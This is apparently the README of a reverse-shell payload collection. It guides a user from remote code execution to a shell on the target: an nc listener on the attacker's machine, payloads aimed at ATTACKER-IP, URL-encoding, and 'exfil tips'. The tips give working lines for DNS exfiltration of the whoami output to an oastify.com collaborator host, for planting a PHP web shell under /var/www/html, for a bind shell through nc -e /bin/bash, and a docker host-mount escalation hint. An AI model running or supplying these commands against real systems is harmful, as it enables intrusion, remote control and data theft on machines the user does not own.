# Reverse Shells (multi-language)

A reverse shell is your standard payoff when you get command execution (RCE) — SQLi → file write, command injection, SSTI → RCE, deserialization, upload bypass, etc.

## How to use
1. Start a listener on YOUR machine:
   ```
   nc -lnvp 4444
   ```
   (or `rlwrap nc -lnvp 4444`, or use `msfconsole` with `exploit/multi/handler`)
2. Pick a shell that exists on the target (check with `which python3 bash nc socat`).
3. Replace `ATTACKER-IP` and `4444` with your values.
4. URL-encode the payload if you put it in a URL.
5. If no TCP works, try **payload 1:1** variants, or DNS-exfil only (see `exfil-tips` section).

## Files
- `reverse-shells.txt` — all one-liners
- `README.md` — this guide + exfil tips

## Exfil-tips when a shell is blocked
- **DNS exfil** (usually allowed): `nslookup $(whoami).COLLAB.oastify.com`
- **Write a file**: `echo '<?php system($_GET["c"]);?>' > /var/www/html/sh.php` then browse it
- **Bind shell** `nc -lnvp 4444 -e /bin/bash` if outbound is blocked but inbound works
- **SSH/Docker/sudo tricks**: `sudo -l`, `docker run -v /:/mnt ...`
- If Python is available, most one-line shells above work reliably